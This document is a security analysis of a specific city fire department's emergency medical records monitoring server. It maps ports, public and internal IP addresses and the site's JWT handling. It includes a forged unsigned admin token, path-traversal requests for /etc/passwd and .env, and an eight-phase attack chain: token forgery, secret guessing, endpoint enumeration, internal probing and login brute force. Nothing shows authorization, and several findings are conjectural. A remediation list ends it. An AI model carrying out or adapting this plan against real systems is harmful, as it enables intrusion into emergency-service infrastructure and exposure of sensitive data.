# EPCR.tpf.gov.tw:4005 - Comprehensive Security Analysis
## Target: Fire Department (消防局) Monitor Server

### Target Overview
- **Domain**: epcr.tpf.gov.tw | **IP**: 118.163.107.93 (HiNet)
- **Stack**: Node.js Express + AngularJS 1.x SPA + socket.io
- **Auth**: JWT (angular-jwt) with localStorage persistence
- **Org**: 政府機關-市政府-消防局 (Government - City - Fire Department)

### Infrastructure Map (Confirmed via /config)
| Port | Service | Key Config |
|------|---------|------------|
| 4000 | EPCR Server | vitalSignVideoServer:4001, historyVideoPath:/videoData/getFile/, imagePath:/imageData/getFile/ |
| 4001 | VitalSign Video | Discovered in 4000 config; not yet probed |
| 4002 | Hospital/Doctor | SELF_URL:4002, EPCRServer:4000, authServer:4004, MerBridge:internal |
| 4004 | Auth Server | /config → **401 Unauthorized** (requires auth) |
| 4005 | Monitor (target) | EPCRServer:4000, authServer:4004, MerSocketio:172.28.4.12:8080, ConnWatcher:172.28.4.12:8188 |

### JWT Configuration (CRITICAL)
```javascript
// From publicConfig.js
jwtOptionsProvider.config({
    tokenGetter: ['$location', function($location) {
        var tokenQs = $location.search().token;  // ← Token via URL!
        if(tokenQs){
            localStorage.setItem(AUTH_LOCALSTORAGE_KEY, tokenQs);
            return tokenQs;
        }else{
            return localStorage.getItem(AUTH_LOCALSTORAGE_KEY);
        }
    }],
    whiteListedDomains: ['localhost','47.97.114.73','118.163.107.93',
                         'epcr.tpf.gov.tw','35.234.50.28']
    //                        ^^^^^^^^^^^ DANGEROUS: localhost whitelisted!
});
```

### Permission Model
- JWT payload: `{user: {name, role, username}, permissions: [...], iss, exp, iat}`
- `checkPerm(target)` → `tokenPayload.permissions.indexOf(target) != -1` (client-side)
- `ADMIN` role → `MONITOR_ALL` permission
- Auth header: `Authorization: Bearer <token>`

### Login Flow
1. GET `/config` → `{authServer: "https://epcr.tpf.gov.tw:4004", ...}`
2. GET `authServer/captcha?t=<timestamp>` → captcha image
3. POST `authServer/login` with `{username, password, captcha}` (withCredentials: true)
4. Response: `{token, refreshToken}` → localStorage

---

## IDENTIFIED VULNERABILITIES

### VULN-1: JWT whiteListedDomains includes "localhost" (HIGH)
**Type**: Authentication Bypass / JWT Issuer Validation Bypass
**Description**: angular-jwt validates `iss` claim against `whiteListedDomains`. Since `localhost` is in the list, a forged JWT with `iss:"localhost"` passes client-side validation. If server-side validation uses the same list or is weaker, this enables full auth bypass.
**Exploit**: Forge JWT with `alg:none` or weak HMAC, `iss:"localhost"`, `permissions:["*"]`
**Impact**: Full admin access to Monitor Server and potentially all 4 services
**POC**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjp7Im5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifSwicGVybWlzc2lvbnMiOlsiKiIsIk1PTklUT1JfQUxMIl0sImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6OTk5OTk5OTk5OX0.`

### VULN-2: Token Accepted via URL Query Parameter (MEDIUM)
**Type**: Insecure Token Handling / Token Injection
**Description**: `tokenGetter` accepts `?token=...` from URL and stores in localStorage. Enables:
- Phishing link with forged token
- XSS to inject token via URL
- Token leakage via server logs, referrer headers, browser history
**Impact**: Token injection, session hijacking, credential theft

### VULN-3: Internal Network Topology Exposure (MEDIUM)
**Type**: Information Disclosure
**Description**: `MerSocketio: http://172.28.4.12:8080` and `ConnWatcher: http://172.28.4.12:8188` exposed in public JS config.
**Impact**: Enables targeted SSRF, internal service attacks, network mapping
**Evidence**: `publicConfig.js` → `MerSocketio: "http://172.28.4.12:8080"`

### VULN-4: Multiple Services on Same Domain (MEDIUM)
**Type**: Insecure Architecture / Cross-Service Attack Surface
**Description**: 5 services on same domain (4000-4005) with shared JWT validation. Potential:
- Cross-service SSRF between services
- Shared auth bypass (forge token once, access all)
- Auth server (4004) /config returns 401 (info disclosure via error)
**Impact**: Lateral movement between services, cross-service privilege escalation

### VULN-5: Client-Side Permission Checking (MEDIUM)
**Type**: Broken Access Control
**Description**: `checkPerm()` is JavaScript-only. If server endpoints don't re-validate permissions from JWT payload, a low-privilege token can access admin functions.
**Impact**: Privilege escalation via forged/modified JWT permissions array

### VULN-6: Video/Image File Serving - Path Traversal (MEDIUM-HIGH)
**Type**: Path Traversal / LFI
**Description**: Port 4000 serves files at `/videoData/getFile/` and `/imageData/getFile/`. If file parameter is user-controlled without proper sanitization:
- `GET /videoData/getFile/../../etc/passwd`
- `GET /videoData/getFile/../../../.env`
**Impact**: Arbitrary file read, source code disclosure, credential theft

### VULN-7: JWT Algorithm Confusion (LOW-MEDIUM)
**Type**: JWT Algorithm Confusion
**Description**: If server expects RS256 but accepts HS256, attacker can sign with public key as HMAC secret. If `alg:none` is accepted, signature check is bypassed entirely.
**Impact**: Token forgery, auth bypass

### VULN-8: Captcha-Protected Login - Bypass Opportunity (LOW)
**Type**: Brute Force / Captcha Bypass
**Description**: Login requires captcha image. If captcha is sessionless or predictable, brute force becomes feasible. `withCredentials:true` means cookies are sent on login.
**Impact**: Credential brute force, session fixation

### VULN-9: AngularJS 1.x Framework (LOW)
**Type**: Known CVEs / Framework Vulnerabilities
**Description**: AngularJS 1.x has known CVEs (SAP, template injection, XSS). Version-specific attacks possible.
**Impact**: XSS, DOM clobbering, template injection

---

## ATTACK CHAIN

### Phase 1: JWT Forgery (alg:none)
```
Header: {"alg":"none","typ":"JWT"}
Payload: {"user":{"name":"admin","role":"admin","username":"admin"},
          "permissions":["*","MONITOR_ALL","MONITOR_DEVICE","MONITOR_ALARM"],
          "iss":"localhost","exp":9999999999,"iat":1700000000}
→ Test against all 5 ports (4000-4005) API endpoints
```

### Phase 2: Weak HMAC Secret Brute Force
Try 50+ common secrets: secret, password, jwt_secret, epcr, monitor,
changeme, admin, epcr2024, tpf, fire, firedepartment, etc.

### Phase 3: Auth Server Enumeration (Port 4004)
Probe: /login, /captcha, /refresh, /logout, /api/users, /api/roles,
/actuator/*, /.env, /.git/config, /swagger-ui.html, /graphql

### Phase 4: Monitor Server API Enumeration (Port 4005)
Probe: /api/monitor, /api/devices, /api/alarms, /api/cameras,
/api/feeds, /socket.io/, /actuator/*, /js/MonitorCtrl.js

### Phase 5: Video/Image Path Traversal (Port 4000)
Test: /videoData/getFile/../../etc/passwd,
/imageData/getFile/../../../.env, /videoData/getFile/?file=../etc/passwd

### Phase 6: Internal Service Probing
Direct: 172.28.4.12:8080, 172.28.4.12:8188
SSRF: Via any user-input URL parameter

### Phase 7: Captcha Bypass / Login Brute Force
OCR captcha image, try common credentials, check for rate limiting

### Phase 8: Token via URL
`GET :4005/?token=<forged>` → localStorage injection

---

## RECOMMENDED REMEDIATION
1. Remove `localhost` from `whiteListedDomains`
2. Validate JWT `iss` server-side against production domain only
3. Reject `alg:none` tokens on server
4. Use strong random HMAC secret (256-bit)
5. Remove token-from-URL functionality or validate token origin
6. Add path traversal protection to video/image file serving
7. Remove internal IPs from public-facing JS config
8. Implement server-side permission validation
9. Add rate limiting to login endpoint
10. Upgrade AngularJS to 1.8.3+ (patched)
